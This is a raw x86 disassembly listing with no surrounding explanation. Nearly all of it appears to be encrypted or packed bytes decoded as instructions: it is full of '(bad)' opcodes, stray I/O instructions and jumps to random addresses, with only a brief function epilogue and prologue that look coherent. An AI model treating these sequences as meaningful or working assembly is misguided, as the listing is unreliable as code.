  40ff1d:	popf   
  40ff1e:	popf   
  40ff1f:	cld    
  40ff20:	cmc    
  40ff21:	cs (bad) 
  40ff24:	sbb    bh,ah
  40ff26:	push   ebx
  40ff27:	xor    al,0x8c
  40ff29:	dec    edi
  40ff2a:	dec    DWORD PTR [ebp+0x25]
  40ff2d:	cmp    ebp,ebx
  40ff2f:	in     al,dx
  40ff30:	cld    
  40ff31:	das    
  40ff32:	pop    eax
  40ff33:	retf   
  40ff34:	out    0x3c,al
  40ff36:	or     eax,0x813bfc41
  40ff3b:	push   ebx
  40ff3c:	add    BYTE PTR [edi-0xfe62c87],bl
  40ff42:	push   edx
  40ff43:	sbb    edx,DWORD PTR [ecx-0x1c815ec4]
  40ff49:	push   edx
  40ff4a:	cmp    esi,ebx
  40ff4c:	jg     0x40feee
  40ff4e:	stc    
  40ff4f:	dec    esi
  40ff50:	test   BYTE PTR [eax],bh
  40ff52:	or     BYTE PTR [ebx+0x7f29ac23],cl
  40ff58:	(bad)  
  40ff59:	pop    edx
  40ff5a:	inc    esi
  40ff5b:	mov    ds:0xfe46e469,eax
  40ff60:	and    BYTE PTR [esi],ch
  40ff62:	ins    DWORD PTR es:[edi],dx
  40ff63:	add    ecx,esp
  40ff65:	jle    0x40ff08
  40ff67:	js     0x40ff84
  40ff69:	xchg   DWORD PTR [ebp-0x7d11fc2a],edx
  40ff6f:	jo     0x40fef3
  40ff71:	inc    edx
  40ff72:	xchg   edx,eax
  40ff73:	jmp    0x40ffc9
  40ff75:	cmp    eax,0x4edb6bdd
  40ff7a:	int3   
  40ff7b:	fwait
  40ff7c:	test   eax,0x21e80d3c
  40ff81:	jecxz  0x40ff7b
  40ff83:	(bad)  
  40ff85:	and    bl,cl
  40ff87:	sahf   
  40ff88:	sub    esi,DWORD PTR ds:0x7cea6178
  40ff8e:	retf   
  40ff8f:	xchg   DWORD PTR [eax+0x4e3f2354],ecx
  40ff95:	push   edi
  40ff96:	mov    esi,0xe2703b9
  40ff9b:	and    dx,sp
  40ff9e:	jecxz  0x40ffbd
  40ffa0:	mov    WORD PTR [ebx],fs
  40ffa2:	xchg   BYTE PTR [ebp-0x55],al
  40ffa5:	pushf  
  40ffa6:	cli    
  40ffa7:	mov    eax,ds:0x3694b3c
  40ffac:	dec    ecx
  40ffad:	ds add eax,0x964d8e97
  40ffb3:	sub    al,BYTE PTR [ecx-0x15]
  40ffb6:	and    al,0x6c
  40ffb8:	mov    ecx,0x2bb99c04
  40ffbd:	ins    DWORD PTR es:[edi],dx
  40ffbe:	cmp    ebx,DWORD PTR [edx]
  40ffc0:	in     al,0x5f
  40ffc2:	call   0xe35ab57f
  40ffc7:	push   ebp
  40ffc8:	stos   DWORD PTR es:[edi],eax
  40ffc9:	aam    0x6f
  40ffcb:	enter  0x764a,0xb5
  40ffcf:	outs   dx,BYTE PTR ds:[esi]
  40ffd0:	xor    ecx,DWORD PTR ds:0xf8a26670
  40ffd6:	sbb    ebx,DWORD PTR [edx+ebx*2]
  40ffd9:	jl     0x40ffd3
  40ffdb:	cmp    cl,BYTE PTR [ecx+edx*4+0x667dd67e]
  40ffe2:	adc    eax,DWORD PTR [esi-0x6bfe451b]
  40ffe8:	and    ecx,esp
  40ffea:	iret   
  40ffeb:	rol    ebx,1
  40ffed:	sbb    al,0x76
  40ffef:	add    edx,0x4d
  40fff2:	das    
  40fff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fff4:	in     eax,0x3b
  40fff6:	sub    esp,edx
  40fff8:	jnp    0x410068
  40fffa:	(bad)  
  40fffb:	es loopne 0x41007b
  40fffe:	mov    DWORD PTR ds:[ebx+0x738249f7],esp
  410005:	pop    eax
  410006:	xchg   BYTE PTR [eax-0x51],bl
  410009:	sub    ch,BYTE PTR [ebx+eax*1]
  41000c:	(bad)  
  41000e:	shl    bh,1
  410010:	sub    DWORD PTR [esi+edx*8],0xfffffffe
  410014:	adc    bh,BYTE PTR [edx+0x6d9eb126]
  41001a:	bound  ebx,QWORD PTR ds:0xb12c720b
  410020:	xor    ebp,DWORD PTR [eax-0x65]
  410023:	icebp  
  410024:	pusha  
  410025:	jne    0x410024
  410027:	mov    al,ds:0x10d0313a
  41002c:	push   0x4df8eeb0
  410031:	mov    edx,0x48bdc254
  410036:	outs   dx,BYTE PTR ds:[esi]
  410037:	loopne 0x40ffc9
  410039:	dec    edi
  41003a:	shl    DWORD PTR [eax-0x15b5092d],1
  410040:	or     al,ah
  410042:	and    eax,0x78a94fa1
  410047:	mov    edi,0x74d58df2
  41004c:	imul   ecx,edx,0xe42bb7b3
  410052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410054:	xor    BYTE PTR [ebp+0x2bd0a93a],ah
  41005a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41005b:	je     0x410094
  41005d:	push   esp
  41005e:	push   ecx
  41005f:	les    ebp,FWORD PTR [eax]
  410061:	cdq    
  410062:	adc    ecx,esi
  410064:	inc    ebp
  410065:	jno    0x4100a7
  410067:	cli    
  410068:	cs jbe 0x41000f
  41006b:	jne    0x410060
  41006d:	dec    ecx
  41006e:	imul   edi,DWORD PTR [edx+0x28],0xf67fa0b4
  410075:	xchg   ebp,eax
  410076:	addr16 push ecx
  410078:	push   ds
  410079:	es jns 0x41005b
  41007c:	imul   edi,DWORD PTR [ebp+0x52],0x24
  410080:	daa    
  410081:	lds    edi,FWORD PTR [edx-0xff2c6c7]
  410087:	pop    ss
  410088:	sbb    ch,BYTE PTR [edi-0x71]
  41008b:	jmp    0x332bd4fe
  410090:	xchg   bl,cl
  410092:	mov    BYTE PTR [esi-0x47],dh
  410095:	push   ds
  410096:	mov    gs,WORD PTR es:[eax+0x74cc750f]
  41009d:	gs ds jecxz 0x410037
  4100a1:	out    0x8a,al
  4100a3:	test   eax,0xbd338293
  4100a8:	cwde   
  4100a9:	dec    esi
  4100aa:	add    BYTE PTR [esi],ch
  4100ac:	mov    ah,0x6a
  4100ae:	dec    ecx
  4100af:	mov    ds:0x8be2c400,eax
  4100b4:	jp     0x410135
  4100b6:	cmp    DWORD PTR [eax+ebp*4],ebp
  4100b9:	aas    
  4100ba:	fmul   DWORD PTR [ecx+0x7a11e311]
  4100c0:	adc    al,0x93
  4100c2:	mov    ebp,0x54e793d8
  4100c7:	mov    edx,0x97778591
  4100cc:	jne    0x410090
  4100ce:	je     0x410057
  4100d0:	stos   BYTE PTR es:[edi],al
  4100d1:	fbld   TBYTE PTR [eax]
  4100d3:	add    al,0x93
  4100d5:	mov    bh,0xa0
  4100d7:	cwde   
  4100d8:	cmp    esp,DWORD PTR [edx+0x7309200]
  4100de:	pop    ebp
  4100df:	pop    edi
  4100e0:	in     al,0x5a
  4100e2:	leave  
  4100e3:	gs jg  0x4100c6
  4100e6:	xor    ebx,eax
  4100e8:	(bad)  
  4100e9:	popa   
  4100ea:	push   ds
  4100eb:	ror    BYTE PTR [ebx],cl
  4100ed:	mov    ch,BYTE PTR [edi+esi*2-0x43]
  4100f1:	pop    edi
  4100f2:	sbb    al,0xc6
  4100f4:	fst    QWORD PTR [eax+0x75]
  4100f7:	mov    cl,0x82
  4100f9:	in     al,dx
  4100fa:	xchg   edi,eax
  4100fb:	or     eax,0x336f1e91
  410100:	jbe    0x4100ec
  410102:	rcr    DWORD PTR [edx+0x48026b95],cl
  410108:	inc    bp
  41010a:	lahf   
  41010b:	add    al,0x99
  41010d:	push   eax
  41010e:	jg     0x410167
  410110:	sbb    DWORD PTR [ebx+eax*2],edx
  410113:	dec    BYTE PTR [ebx+0x67]
  410116:	mov    dl,0x35
  410118:	jmp    0x410135
  41011a:	and    BYTE PTR [ecx+0x33583e5a],0x92
  410121:	retf   0xce53
  410124:	sahf   
  410125:	mov    esp,0xaa2eac22
  41012a:	mov    ecx,0x8ab6e408
  41012f:	loope  0x41015d
  410131:	mov    ds:0xf471f58e,al
  410136:	xchg   edx,eax
  410137:	(bad)  
  410138:	ror    DWORD PTR cs:[bx],1
  41013c:	dec    esi
  41013d:	leave  
  41013e:	shr    DWORD PTR ds:0x389de5ce,1
  410144:	cld    
  410145:	in     al,0x55
  410147:	stos   BYTE PTR es:[edi],al
  410148:	arpl   WORD PTR [edi+0x1c],dx
  41014b:	inc    ecx
  41014c:	mov    cl,0x6b
  41014e:	sbb    esi,DWORD PTR [ecx]
  410150:	sar    DWORD PTR [esp+edx*1+0x7e54cf2a],0x7a
  410158:	and    al,0xc0
  41015a:	test   DWORD PTR es:[ecx],0xac2d44f8
  410161:	lea    eax,[edi*1-0x67aff243]
  410168:	sub    edx,DWORD PTR [ebx+eax*2+0x46bc3bb8]
  41016f:	sub    eax,DWORD PTR [edi-0x26]
  410172:	(bad)  
  410173:	fcmove st,st(7)
  410175:	mov    ah,0xf3
  410177:	mov    edx,0x5a222af8
  41017c:	fs loop 0x4101c1
  41017f:	or     eax,edx
  410181:	outs   dx,DWORD PTR ds:[esi]
  410182:	or     esi,edi
  410184:	push   edi
  410185:	push   es
  410186:	xchg   ecx,eax
  410187:	bound  edi,QWORD PTR [ecx]
  410189:	xchg   edi,eax
  41018a:	fisub  DWORD PTR [ebp-0x7683a8c9]
  410190:	shl    DWORD PTR [esi-0x42],0x3a
  410194:	or     al,0x87
  410196:	stos   DWORD PTR es:[edi],eax
  410197:	mov    dh,0x45
  410199:	cmp    DWORD PTR [edx+0x4ec3d53],eax
  41019f:	or     eax,0xfbd863dc
  4101a4:	or     al,0x9a
  4101a6:	or     eax,esp
  4101a8:	lahf   
  4101a9:	pop    es
  4101aa:	pop    ebx
  4101ab:	lods   al,BYTE PTR ds:[esi]
  4101ac:	cmc    
  4101ad:	fstp   TBYTE PTR [eax-0x3563ef28]
  4101b3:	lock cmp ebp,esi
  4101b6:	enter  0x3f4b,0x1b
  4101ba:	hlt    
  4101bb:	xchg   edx,eax
  4101bc:	popf   
  4101bd:	sub    cl,BYTE PTR [ebp+0x12c60239]
  4101c3:	and    edi,DWORD PTR [esi+0x5bfd62dd]
  4101c9:	jg     0x41019c
  4101cb:	retf   0x43
  4101ce:	jbe    0x410163
  4101d0:	sub    BYTE PTR [edx-0x4e],al
  4101d3:	stc    
  4101d4:	test   DWORD PTR [ebp+edi*4+0x3b],esp
  4101d8:	xchg   esp,eax
  4101d9:	(bad)  
  4101da:	jle    0x410223
  4101dc:	xor    BYTE PTR [esi-0xf],dh
  4101df:	jae    0x410167
  4101e1:	(bad)  
  4101e2:	std    
  4101e3:	sbb    ebp,DWORD PTR [ebx]
  4101e5:	addr16 sahf 
  4101e7:	test   DWORD PTR [edi+0x7e4ec164],ecx
  4101ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101ee:	sahf   
  4101ef:	pop    ss
  4101f0:	mov    WORD PTR [edi+ebp*2],gs
  4101f3:	or     DWORD PTR ds:0xfcac5bf3,edx
  4101f9:	dec    edi
  4101fa:	add    al,0x50
  4101fc:	mov    bl,0x26
  4101fe:	test   eax,0x899d846c
  410203:	xchg   BYTE PTR [eax-0x18],dl
  410206:	mov    ebp,0x9c0d7db
  41020b:	jo     0x4101f0
  41020d:	leave  
  41020e:	arpl   WORD PTR [edi-0x4ef534b0],cx
  410214:	pop    eax
  410215:	sbb    DWORD PTR [edi+0x5d],ebx
  410218:	add    bh,ch
  41021a:	in     eax,0x7a
  41021c:	mov    edi,0x4e19cbd
  410221:	inc    esp
  410222:	(bad)  
  410223:	(bad)  
  410224:	not    DWORD PTR [ebx+eiz*4-0x3f782f16]
  41022b:	mov    ?,WORD PTR [ebx+0x1671a9e3]
  410231:	lods   al,BYTE PTR ds:[esi]
  410232:	jmp    0x4101ea
  410234:	es popa 
  410236:	dec    esp
  410237:	mov    bl,0x67
  410239:	ret    
  41023a:	das    
  41023b:	call   0x93b02718
  410240:	xor    al,0x69
  410242:	js     0x410252
  410244:	lock pop edx
  410246:	dec    ecx
  410247:	adc    bl,BYTE PTR [edx-0xa]
  41024a:	leave  
  41024b:	ds xor eax,0x3a8ae3d0
  410251:	ins    BYTE PTR es:[edi],dx
  410252:	mov    dl,0x5
  410254:	popa   
  410255:	jne    0x41020f
  410257:	jmp    0x7b28:0xdb9c5288
  41025e:	in     eax,0x14
  410260:	test   BYTE PTR [ebp-0x42],dh
  410263:	pop    ds
  410264:	lahf   
  410265:	mov    bh,0x5
  410267:	lock inc ebp
  410269:	jae    0x41026b
  41026b:	stc    
  41026c:	addr16 sub bh,al
  41026f:	pushf  
  410270:	pop    esi
  410271:	scas   al,BYTE PTR es:[edi]
  410272:	jecxz  0x4101f4
  410274:	jo     0x4102de
  410276:	rcl    bh,0x1c
  410279:	pop    edi
  41027a:	mov    ds:0x86086f7c,al
  41027f:	push   DWORD PTR [ebp+0xc0c2041]
  410285:	pop    ebp
  410286:	jmp    0x4102bf
  410288:	popa   
  410289:	idiv   BYTE PTR [ebx]
  41028b:	fild   QWORD PTR [esi-0x11]
  41028e:	mov    esp,0x788de0c5
  410293:	add    ecx,DWORD PTR [ebp-0x762029fc]
  410299:	outs   dx,DWORD PTR ds:[esi]
  41029a:	mov    eax,0xaf9561a2
  41029f:	call   0xbca3bb38
  4102a4:	fwait
  4102a5:	(bad)  
  4102a6:	sbb    BYTE PTR [eax+0x8aa7b84],bh
  4102ac:	popf   
  4102ad:	lods   al,BYTE PTR fs:[esi]
  4102af:	test   BYTE PTR [esi+0x6b1245ec],dh
  4102b5:	mov    edx,0x72249502
  4102ba:	bound  edx,QWORD PTR [edx-0x3acd8e7a]
  4102c0:	add    ecx,ecx
  4102c2:	aam    0x58
  4102c4:	adc    eax,0xd88fe65f
  4102c9:	stos   DWORD PTR es:[edi],eax
  4102ca:	gs pop edi
  4102cc:	les    edx,FWORD PTR [eax-0x34]
  4102cf:	adc    DWORD PTR [eax+esi*1+0x7cb28034],esp
  4102d6:	fimul  DWORD PTR [esp+esi*8+0x1a]
  4102da:	xlat   BYTE PTR ds:[ebx]
  4102db:	div    DWORD PTR [edx-0x472f7eb6]
  4102e1:	pop    edx
  4102e2:	loop   0x41026d
  4102e4:	imul   ecx,DWORD PTR [edi],0x51
  4102e7:	xor    BYTE PTR [eax+0x1f56f8f3],dl
  4102ed:	sbb    BYTE PTR [ebp-0x73],0xf9
  4102f1:	(bad)  [eax+0x6a505681]
  4102f7:	jmp    FWORD PTR [eax+0x5e]
  4102fa:	xor    BYTE PTR [edx+0x5],dl
  4102fd:	push   DWORD PTR [ebx+ecx*8-0x691230c5]
  410304:	pop    esi
  410305:	mov    ?,ecx
  410307:	push   ds
  410308:	sub    al,0x8e
  41030a:	je     0x410313
  41030c:	inc    ebp
  41030d:	or     ecx,edx
  41030f:	adc    dl,BYTE PTR [edx+0x1142c300]
  410315:	pop    esp
  410316:	clc    
  410317:	pop    ecx
  410318:	jl     0x4102b8
  41031a:	and    DWORD PTR [ebx],edx
  41031c:	out    dx,eax
  41031d:	xchg   esi,ecx
  41031f:	pop    esp
  410320:	rcr    DWORD PTR [esi+0xc],0x7f
  410324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410325:	push   0xf3c0629e
  41032a:	pop    es
  41032b:	ja     0x410372
  41032d:	pusha  
  41032e:	adc    esi,DWORD PTR [ebx]
  410330:	rcr    BYTE PTR [edi],0x4d
  410333:	mov    fs,WORD PTR [esi-0x316dbcd0]
  410339:	test   BYTE PTR [eax],al
  41033b:	push   edx
  41033c:	and    DWORD PTR [edx],ebp
  41033e:	cmp    BYTE PTR [eax+0x1f],0xa0
  410342:	shl    BYTE PTR [edx+0x2a],0x6c
  410346:	dec    edx
  410347:	test   eax,0xe7827df6
  41034c:	dec    ebp
  41034d:	add    al,0x9e
  41034f:	mov    bl,0x3
  410351:	push   edi
  410352:	ret    
  410353:	lods   eax,DWORD PTR ds:[esi]
  410354:	xor    edi,esi
  410356:	ret    
  410357:	lahf   
  410358:	out    0xb6,eax
  41035a:	sbb    BYTE PTR [edx-0x5c],dh
  41035d:	and    DWORD PTR [esi],esi
  41035f:	mov    ah,0x1e
  410361:	ss sub al,0x2a
  410364:	add    DWORD PTR [ebp-0x6e],0xfffffffc
  410368:	dec    esp
  410369:	loope  0x4103bf
  41036b:	test   al,0x17
  41036d:	jl     0x410389
  41036f:	jns    0x4103c1
  410371:	jbe    0x41032d
  410373:	lods   eax,DWORD PTR ds:[esi]
  410374:	test   dh,dl
  410376:	pop    es
  410377:	dec    edx
  410378:	neg    DWORD PTR [ecx+0xee5ef23]
  41037e:	lahf   
  41037f:	jp     0x4103fa
  410381:	shl    dh,cl
  410383:	pop    esp
  410384:	call   0x76756463
  410389:	stc    
  41038a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41038b:	jno    0x79c14c0b
  410391:	in     al,dx
  410392:	nop
  410393:	xchg   ecx,eax
  410394:	xor    esp,DWORD PTR [ebp+0x1f]
  410397:	adc    ch,BYTE PTR [ebx]
  410399:	xchg   ebx,eax
  41039a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41039b:	pop    ds
  41039c:	adc    DWORD PTR [esp+ebp*8+0x65],0xbdd943fe
  4103a4:	cdq    
  4103a5:	xchg   DWORD PTR [ebx-0x30],esp
  4103a8:	out    dx,al
  4103a9:	je     0x4103f6
  4103ab:	jp     0x4103e2
  4103ad:	fmul   QWORD PTR [ebp-0x742ec313]
  4103b3:	xor    BYTE PTR [ecx-0x16],0xca
  4103b7:	or     ch,BYTE PTR [edi]
  4103b9:	clc    
  4103ba:	mov    ds:0x16c19ad3,al
  4103bf:	test   al,0xda
  4103c1:	test   al,0x13
  4103c3:	jge    0x4103dc
  4103c5:	inc    ecx
  4103c6:	mov    eax,DWORD PTR [ebp+0xc]
  4103c9:	xor    eax,esi
  4103cb:	add    eax,edi
  4103cd:	pop    edi
  4103ce:	pop    esi
  4103cf:	pop    ebx
  4103d0:	leave  
  4103d1:	ret    0x8
  4103d4:	push   ebp
  4103d5:	mov    ebp,esp
  4103d7:	mov    DWORD PTR ds:0x41c663,0xf89c85b9
  4103e1:	mov    DWORD PTR ds:0x42e01c,0x3e72
  4103eb:	jmp    0x41273a
  4103f0:	push   eax
  4103f1:	inc    edi
  4103f2:	lds    ecx,FWORD PTR [ebx]
  4103f4:	mov    ds:0xc6e3668b,eax
  4103f9:	dec    eax
  4103fa:	ja     0x41046f
  4103fc:	cmp    DWORD PTR [eax],edi
  4103fe:	adc    eax,0x608c15e3
  410403:	pusha  
  410404:	cs pop edi
  410406:	pusha  
  410407:	pusha  
  410408:	or     dl,BYTE PTR [esi]
  41040a:	ftst   
  41040c:	repnz fisttp DWORD PTR [eax]
  41040f:	loopne 0x410406
  410411:	aas    
  410412:	jb     0x410418
  410414:	sbb    BYTE PTR [edx],al
  410416:	inc    ecx
  410417:	popa   
  410418:	pop    ecx
  410419:	adc    DWORD PTR [eax-0xa53f8fe],eax
  41041f:	hlt    
  410420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410421:	ins    DWORD PTR es:[edi],dx
  410422:	jne    0x4103ba
  410424:	mov    al,ds:0x82c0566
  410429:	add    BYTE PTR [esp+ebp*2+0x19],dl
  41042d:	jmp    0xb149:0x6df9b32d
  410434:	shl    ah,cl
  410436:	xchg   edi,eax
  410437:	pop    edx
  410438:	std    
  410439:	add    ch,dl
  41043b:	call   0xb03:0xd7d04fcd
  410442:	jge    0x4103db
  410444:	xchg   ecx,eax
  410445:	into   
  410446:	ficom  WORD PTR [eax-0x77]
  410449:	retf   0xe297
  41044c:	push   cs
  41044d:	test   al,cl
  41044f:	mov    edx,0xd0ab296d
  410454:	mov    al,ds:0xf1afb51e
  410459:	mov    bh,0xe9
  41045b:	xchg   DWORD PTR [edi+esi*2],edx
  41045e:	dec    eax
  41045f:	jbe    0x410470
  410461:	adc    bl,BYTE PTR [ebx+0x7a]
  410464:	inc    ecx
  410465:	test   BYTE PTR [edx],cl
  410467:	test   BYTE PTR [ebx],bh
  410469:	std    
  41046a:	xchg   ebx,eax
  41046b:	ins    DWORD PTR es:[edi],dx
  41046c:	inc    ecx
  41046d:	mov    edi,0xf5180205
  410472:	xchg   edi,eax
  410473:	fisubr WORD PTR [esi]
  410475:	mov    al,ds:0xeab537d
  41047a:	lds    ecx,FWORD PTR [edi-0x9]
  41047d:	xchg   edi,eax
  41047e:	sbb    BYTE PTR [esi],cl
  410480:	repz mov edx,0x1a637baf
  410486:	inc    ebx
  410487:	pop    esp
  410488:	(bad)  
  410489:	stos   DWORD PTR es:[edi],eax
  41048a:	mov    bl,0xbe
  41048c:	inc    ebp
  41048d:	ins    DWORD PTR es:[edi],dx
  41048e:	arpl   WORD PTR [edx],ax
  410490:	in     al,0x8e
  410492:	push   edi
  410493:	repz mov al,ds:0x551e4dfc
  410499:	mov    bh,0x86
  41049b:	imul   ebx,DWORD PTR [ebx+edx*1+0x28],0x31
  4104a0:	ss pusha 
  4104a2:	stos   BYTE PTR es:[edi],al
  4104a3:	ret    0x8cab
  4104a6:	test   al,0x10
  4104a8:	mov    ebp,0x953157c8
  4104ad:	hlt    
  4104ae:	xor    DWORD PTR [esi],ecx
  4104b0:	jmp    0x9f83:0xd51f8e73
  4104b7:	popa   
  4104b8:	outs   dx,DWORD PTR ds:[esi]
  4104b9:	xor    eax,0x6257d282
  4104be:	inc    edx
  4104bf:	push   ebx
  4104c0:	pop    eax
  4104c1:	js     0x41051a
  4104c3:	mov    ah,0xf4
  4104c5:	xlat   BYTE PTR ds:[ebx]
  4104c6:	inc    cl
  4104c8:	ins    BYTE PTR es:[edi],dx
  4104c9:	sahf   
  4104ca:	xor    eax,0xfbd71288
  4104cf:	mov    eax,0x40944112
  4104d4:	jbe    0x41050d
  4104d6:	push   ebx
  4104d7:	xchg   ebx,eax
  4104d8:	and    DWORD PTR [edx+0x6f],ebx
  4104db:	fist   WORD PTR [esi]
  4104dd:	aam    0x48
  4104df:	aam    0xda
  4104e1:	call   0xf50f5832
  4104e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104e7:	mov    al,0x5f
  4104e9:	std    
  4104ea:	xor    cl,BYTE PTR [edi]
  4104ec:	cli    
  4104ed:	pop    ebp
  4104ee:	xor    al,0x9c
  4104f0:	dec    esp
  4104f1:	cmp    eax,0x6d97bd38
  4104f6:	mov    al,ds:0x115155fb
  4104fb:	sub    ch,BYTE PTR [edx-0x6e]
  4104fe:	mov    bh,0x11
  410500:	lock xchg BYTE PTR [ebx+0x36b89e91],cl
  410507:	test   al,0x9
  410509:	call   FWORD PTR [ecx]
  41050b:	loopne 0x4104a4
  41050d:	shl    DWORD PTR [edi-0x23],0x1b
  410511:	adc    al,0x98
  410513:	(bad)  
  410514:	gs cmp al,0x70
  410517:	jnp    0x41052c
  410519:	fs sahf 
  41051b:	ja     0x410525
  41051d:	jbe    0x410566
  41051f:	jbe    0x41052c
  410521:	test   DWORD PTR [edi-0x709364ff],edx
  410527:	xlat   BYTE PTR ds:[ebx]
  410528:	xchg   ebx,eax
  410529:	mov    ds:0x4b026ea9,eax
  41052e:	pushf  
  41052f:	ret    
  410530:	xchg   ebp,eax
  410531:	pop    es
  410532:	lock out 0xfb,al
  410535:	out    0x90,al
  410537:	mov    DWORD PTR [ebx],esi
  410539:	mov    edx,0xa2130fbd
  41053e:	ret    0xbaad
  410541:	xor    BYTE PTR [ecx+eiz*1],cl
  410544:	scas   eax,DWORD PTR es:[edi]
  410545:	imul   edx,DWORD PTR [edi+0x5006156d],0xfffffff0
  41054c:	ret    
  41054d:	ror    DWORD PTR [edi+0xd3d60cf],0xe8
  410554:	and    al,0xea
  410556:	cwde   
  410557:	loop   0x4105d5
  410559:	and    eax,0x69f6ef1c
  41055e:	push   edx
  41055f:	sbb    DWORD PTR [eax-0xd150eba],0xffffffae
  410566:	dec    esi
  410567:	add    al,0xa
  410569:	test   DWORD PTR [esi+0x1878a6fb],0x4456ea9
  410573:	int3   
  410574:	in     eax,0x5b
  410576:	std    
  410577:	mov    BYTE PTR [ebx],bh
  410579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41057a:	out    dx,al
  41057b:	in     al,0xb1
  41057d:	adc    eax,0xe326f4ef
  410582:	or     al,0xa9
  410584:	hlt    
  410585:	jo     0x4105cf
  410587:	icebp  
  410588:	and    BYTE PTR [edx-0x6ad0840f],bh
  41058e:	push   ss
  41058f:	icebp  
  410590:	dec    esi
  410591:	jo     0x4105e7
  410593:	arpl   WORD PTR [ecx-0x5b1825e6],sp
  410599:	shl    BYTE PTR [ecx-0x3055a8ef],cl
  41059f:	cld    
  4105a0:	inc    edi
  4105a1:	xchg   ebp,eax
  4105a2:	ja     0x4105a9
  4105a4:	cli    
  4105a5:	dec    eax
  4105a6:	aam    0x75
  4105a8:	inc    edi
  4105a9:	mov    al,0xef
  4105ab:	jg     0x410616
  4105ad:	fmul   st,st(5)
  4105af:	test   bh,ch
  4105b1:	addr16 push ebx
  4105b3:	mov    eax,ds:0xba5aaa05
  4105b8:	pop    esp
  4105b9:	inc    esp
  4105ba:	pop    ecx
  4105bb:	cs fdivp st(3),st
  4105be:	call   0xa9f8af1a
  4105c3:	xor    al,0x4
  4105c5:	mov    ebp,0xff7054ed
  4105ca:	cmc    
  4105cb:	cmp    ch,0x4
  4105ce:	retf   
  4105cf:	sahf   
  4105d0:	stos   DWORD PTR es:[edi],eax
  4105d1:	lahf   
  4105d2:	fnstenv [eax]
  4105d4:	sub    edi,DWORD PTR [esp+ebp*1]
  4105d7:	outs   dx,BYTE PTR ds:[esi]
  4105d8:	mov    al,0x1b
  4105da:	mov    ah,0x8b
  4105dc:	das    
  4105dd:	scas   al,BYTE PTR es:[edi]
  4105de:	xchg   ecx,eax
  4105df:	xlat   BYTE PTR ds:[ebx]
  4105e0:	mov    dl,0xec
  4105e2:	fs mov esi,?
  4105e5:	mov    esi,0xbdb6e986
  4105ea:	fsub   QWORD PTR [eax-0x36958140]
  4105f0:	sbb    edx,DWORD PTR [esi+0x5cef3dbf]
  4105f6:	pop    edx
  4105f7:	popf   
  4105f8:	outs   dx,DWORD PTR ds:[esi]
  4105f9:	adc    ecx,ebx
  4105fb:	cmp    edi,DWORD PTR [eax]
  4105fd:	pop    eax
  4105fe:	xlat   BYTE PTR ds:[ebx]
  4105ff:	pop    ebx
  410600:	mov    ss,WORD PTR [ebp+0x49]
  410603:	sbb    ebp,DWORD PTR [edi]
  410605:	fwait
  410606:	inc    ecx
  410607:	xor    DWORD PTR [ebx+0x1d],edx
  41060a:	fxtract 
  41060c:	stos   BYTE PTR es:[di],al
  41060e:	fwait
  41060f:	loope  0x4105b6
  410611:	xlat   BYTE PTR ds:[ebx]
  410612:	out    dx,al
  410613:	hlt    
  410614:	push   0x76
  410616:	xchg   esp,eax
  410617:	jp     0x4105dc
  410619:	fwait
  41061a:	test   DWORD PTR [ebx+0x2b7333f8],esi
  410620:	stos   DWORD PTR es:[edi],eax
  410621:	jb     0x4105f9
  410623:	xchg   ecx,eax
  410624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410625:	inc    esi
  410626:	pop    ss
  410627:	pusha  
  410628:	push   ss
  410629:	dec    edi
  41062a:	call   0x3911b5a4
  41062f:	push   edx
  410630:	fs call 0xea4a32b9
  410636:	inc    esp
  410637:	sub    eax,0x3a24791
  41063c:	lock rol DWORD PTR [edi+0x2],0x48
  410641:	dec    esi
  410642:	pop    edx
  410643:	pop    es
  410644:	add    eax,0x773af544
  410649:	(bad)  
  41064a:	out    0xb1,eax
  41064c:	sbb    al,0x93
  41064e:	jno    0x410610
  410650:	xchg   ecx,eax
  410651:	xchg   BYTE PTR [ebx],ah
  410653:	nop
  410654:	inc    eax
  410655:	lds    esp,FWORD PTR ss:[eax-0x4d]
  410659:	imul   edx,DWORD PTR [ebx],0x32
  41065c:	dec    ecx
  41065d:	pop    esp
  41065e:	adc    edi,ebx
  410660:	cs das 
  410662:	outs   dx,BYTE PTR ds:[esi]
  410663:	adc    BYTE PTR [ecx+0x47],dl
  410666:	mov    edi,0x48faece3
  41066b:	sbb    bl,cl
  41066d:	adc    eax,0x3c1529d6
  410672:	inc    DWORD PTR [esi+0x30]
  410675:	add    al,0x3d
  410677:	sahf   
  410678:	mov    esi,0xd4b4e6b
  41067d:	xchg   edi,eax
  41067e:	fnstcw WORD PTR [edx+0xa]
  410681:	scas   eax,DWORD PTR es:[edi]
  410682:	jg     0x41067e
  410684:	sbb    dh,BYTE PTR [ecx-0x31aa264c]
  41068a:	jmp    0x181990af
  41068f:	and    dl,BYTE PTR [eax+0x13175784]
  410695:	push   ds
  410696:	mov    bh,0xfe
  410698:	mov    ebx,0x9287ca2c
  41069d:	(bad)  
  41069e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41069f:	sbb    DWORD PTR [ecx+esi*1-0x438e9585],ebx
  4106a6:	jecxz  0x41071a
  4106a8:	pop    ebp
  4106a9:	in     al,dx
  4106aa:	lods   al,BYTE PTR ds:[esi]
  4106ab:	outs   dx,DWORD PTR ds:[esi]
  4106ac:	jmp    0xa1a:0x5b54ef45
  4106b3:	lods   eax,DWORD PTR ds:[esi]
  4106b4:	cmc    
  4106b5:	mov    dh,0xdb
  4106b7:	cmp    DWORD PTR [edi+0x6a],0x8d900f70
  4106be:	jecxz  0x4106c1
  4106c0:	pop    ebx
  4106c1:	jp     0x4106ba
  4106c3:	and    al,0x4b
  4106c5:	fsub   DWORD PTR [edi-0x28]
  4106c8:	push   edi
  4106c9:	cld    
  4106ca:	sbb    eax,0x95486c60
  4106cf:	addr16 xchg ecx,eax
  4106d1:	jae    0x41073d
  4106d3:	adc    al,0xae
  4106d5:	out    0x43,al
  4106d7:	add    BYTE PTR [eax+0x1f],dl
